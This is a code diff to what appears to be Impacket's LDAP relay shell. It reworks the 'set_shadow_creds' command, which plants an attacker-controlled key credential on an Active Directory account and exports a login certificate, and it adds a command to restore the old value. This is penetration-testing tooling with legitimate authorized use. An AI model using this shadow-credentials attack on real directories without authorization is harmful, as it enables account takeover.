@@ -30,6 +30,7 @@ from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCE
 from impacket.ldap import ldaptypes
 from impacket.examples.ntlmrelayx.utils import shadow_credentials
 import uuid
+import base64
 
 
 class LdapShell(cmd.Cmd):
@@ -614,6 +615,23 @@ class LdapShell(cmd.Cmd):
                 raise Exception('The server returned an error: %s', self.client.result['message'])
 
     def do_set_shadow_creds(self, line):
+        def parse_key_credential_fields(blob):
+            parts = blob.split(b':', 3)
+            if len(parts) < 3 or parts[0] != b'B':
+                return None
+
+            raw = bytes.fromhex(parts[2].decode())
+            fields = {}
+            i = 4  # skip 4-byte version header
+            while i + 3 <= len(raw):
+                length = int.from_bytes(raw[i:i + 2], 'little')
+                identifier = raw[i + 2]
+                i += 3
+                value = raw[i:i + length]
+                fields[identifier] = value
+                i += length
+            return fields
+
         args = shlex.split(line)
 
         if len(args) != 1:
@@ -633,18 +651,63 @@ class LdapShell(cmd.Cmd):
         key, certificate = shadow_credentials.createSelfSignedX509Certificate(subject=target_name)
         device_id = shadow_credentials.getDeviceId()
         keyCredential = shadow_credentials.KeyCredential(key, deviceId=device_id, currentTime=shadow_credentials.getTicksNow())
-        print("KeyCredential generated with DeviceID: %s" % uuid.UUID(bytes=device_id))
+        print("KeyCredential generated with DeviceID: %s\n" % uuid.UUID(bytes=device_id))
 
         try:
-            new_values = target['msDS-KeyCredentialLink'].raw_values + [shadow_credentials.toDNWithBinary2String(keyCredential.dumpBinary(), target.entry_dn)]
+            old_values = target['msDS-KeyCredentialLink'].raw_values
+
+            for blob in old_values:
+                fields = parse_key_credential_fields(blob)
+                if (0x08 in fields or fields.get(0x07) == b'\x00\x00'):
+                    print("Existing shadow credentials with old schema detected. Aborting...")
+                    return
+                print("Overwriting existing Shadow Credentials. Restore with: ")
+                print(f"restore_shadow_creds {target_name} {base64.b64encode(blob).decode()}\n")
+
+            new_values = [shadow_credentials.toDNWithBinary2String(keyCredential.dumpBinary(), target.entry_dn)]
+            self.client.modify(target.entry_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_DELETE, []]})
+            if self.client.result['result'] not in (0, 16):
+                print('Could not delete object: %s' % self.client.result['message'])
+                return
             self.client.modify(target.entry_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
-            print("Shadow credentials successfully added!")
             if self.client.result['result'] == 0:
+                print("Shadow credentials successfully added!")
                 path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
                 password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
                 shadow_credentials.exportPFX(certificate, key, password=password, path_to_file=path)
                 print("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
-                print("Must be used with password: %s" % password)
+                print("Must be used with password: %s\n" % password)
+            else:
+                if self.client.result['result'] == 50:
+                    print('Could not modify object, the server reports insufficient rights: %s' % self.client.result['message'])
+                elif self.client.result['result'] == 19:
+                    print('Could not modify object, the server reports a constrained violation: %s' % self.client.result['message'])
+                else:
+                    print('The server returned an error: %s' % self.client.result['message'])
+        except IndexError as e:
+            print('Attribute msDS-KeyCredentialLink does not exist')
+        return
+
+    def do_restore_shadow_creds(self, line):
+        args = shlex.split(line)
+
+        if len(args) != 2:
+            raise Exception("Error expecting target name and base64 blob for shadow credentials attack. Recieved %d arguments instead." % len(args))
+
+        target_name = args[0]
+        old_values = base64.b64decode(args[1])
+
+        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(target_name), attributes=['objectSid', 'msDS-KeyCredentialLink'])
+        if success is False or len(self.client.entries) != 1:
+            raise Exception("Error expected only one search result got %d results", len(self.client.entries))
+
+        target = self.client.entries[0]
+
+        try:
+            self.client.modify(target.entry_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_DELETE, []]})
+            self.client.modify(target.entry_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, old_values]})
+            if self.client.result['result'] == 0:
+                print("Successfully restored old msDS-KeyCredentialLink attribute")
             else:
                 if self.client.result['result'] == 50:
                     print('Could not modify object, the server reports insufficient rights: %s' % self.client.result['message'])
@@ -747,6 +810,7 @@ class LdapShell(cmd.Cmd):
  set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
  set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 set_shadow_creds target - Set shadow credentials on the target object (sAMAccountName).
+restore_shadow_creds target old_value_b64 - Restore msDS-KeyCredentialLink attribute with base64 blob of old value.
  start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
  write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
  whoami - get connected user
@@ -756,3 +820,4 @@ set_shadow_creds target - Set shadow credentials on the target object (sAMAccoun
     def do_EOF(self, line):
         print('Bye!\n')
         return True
+
